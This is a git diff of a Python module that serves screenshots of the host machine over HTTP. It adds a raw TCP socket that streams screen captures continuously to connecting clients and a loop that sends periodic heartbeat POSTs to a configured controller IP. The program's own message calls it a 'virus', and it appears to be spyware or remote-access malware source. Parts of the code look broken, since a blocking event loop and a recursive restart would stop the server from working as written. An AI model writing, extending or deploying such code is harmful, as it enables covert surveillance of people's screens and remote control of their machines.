@@ -1,15 +1,18 @@
 import PIL.Image
 import utils as ut
 import uvicorn
-import cv2
+import asyncio
 import PIL
 import io
 import socket
 import math
 import time
+import requests
+import json
 from fastapi import FastAPI,Response
 from runner import prosses_command
 from threading import Thread
+from config import VirConfig
 
 app = FastAPI()
 
@@ -31,12 +34,8 @@ async def get_screenshot(data: dict={}):
         monitor = data["monitor"] if ("monitor" in data.keys()) else 1
         pix = data["pix"] if ("pix" in data.keys()) else None
         img = ut.get_screenshot_async2(monitor,pix) 
-        
-        #_,img_jpeg = cv2.imencode(".jpg",img)
-        #return Response(content=img_jpeg.tobytes(),media_type="image/jpg")
-        
         buffer = io.BytesIO()
-        PIL.Image.fromarray(img).save(buffer,format='JPEG',quality=20)
+        PIL.Image.fromarray(img).save(buffer,format='JPEG',quality=VirConfig['JpegQuality'])
         
         return Response(content=buffer.getvalue(),media_type="image/jpg")
     except Exception as e:
@@ -54,43 +53,45 @@ async def get_recording(data: dict={}):
         print(f"fail to record with error {e}")
         
 
+def open_stream_port():
+    port = VirConfig['StreamPort']
+    host_ip = socket.gethostbyname(socket.gethostname())
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print(f"open stream port at {host_ip}:{port}")
+    try:
+        server_socket.bind((host_ip,port))
+        server_socket.listen(5)
+        client_socket, addr = server_socket.accept()
+        while (True):
+            print("wait")
+            print(f"get connection from {addr}")
+            img = ut.get_screenshot_async2(VirConfig['StreamMonitor'],VirConfig['ImagePixels']) 
+            buffer = io.BytesIO()
+            PIL.Image.fromarray(img).save(buffer,format='JPEG',quality=VirConfig['JpegQuality'])
+            res = buffer.getvalue()
+            print(f"data len is {len(res)}")
+            message = bytes([(len(res) >> (8*i)) & 0xFF for i in range(4)]) + res
+            client_socket.sendall(message)
+    except Exception as e: print(f"FAIL AT OPEN_STREAM_PORT WITH {e}")
+    finally:
+        server_socket.close()
+        print("close stream port")
+        open_stream_port()
+
+async def open_reporter(wait_time=5):
+    while (True):
+        if (len(VirConfig['ControllerIP']) != 0):
+            try: requests.post(f"http://{VirConfig['ControllerIP']}:{VirConfig['RemoteLoggerPort']}",json=json.dumps({'message':'auto log'}))
+            except Exception as e: print(f"open reporter fail with {e}")
+        await asyncio.sleep(wait_time)
 
 def start():
-    ip,port = ut.get_ip(),8000
+    ip,port = ut.get_ip(),8000 
+    Thread(target=open_stream_port).start()
+    asyncio.run(open_reporter())
     uvicorn.run(app,host=ip,port=port)
     print(f"start run virus at {ip}:{port}")
     
-def open_socket():
-    def hanel_req(client, addr, size):
-        img = ut.get_screenshot_async2(1,None) 
-        buffer = io.BytesIO()
-        PIL.Image.fromarray(img).save(buffer,format='JPEG',quality=20)
-        
-        res = buffer.getvalue()
-        
-        """rs_bts = len(res).to_bytes(32,'little')
-        print(f"size is {len(res)}")
-        client.sendto(rs_bts,addr)
-        
-        for i in range(math.ceil(len(res) / size)):
-            part = res[i*size:min(i*size+size,len(res))]
-            print(len(part))
-            client.sendto(part,addr)"""
-        client.sendall(res)
-        client.close()
-    
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-    ip, port = ut.get_ip(), 1234
-    server.bind((ip,port))
-    server.listen(5)
-    print(f"socket on")
-    while (True):
-        #cs, addr = server.recvfrom(2048)
-        cs, addr = server.accept()
-        print(f"got from {addr}")
-        Thread(target=hanel_req,args=(cs,addr,2**14)).start()
-        
 
 if (__name__ == "__main__"):
     print(ut.get_ip())
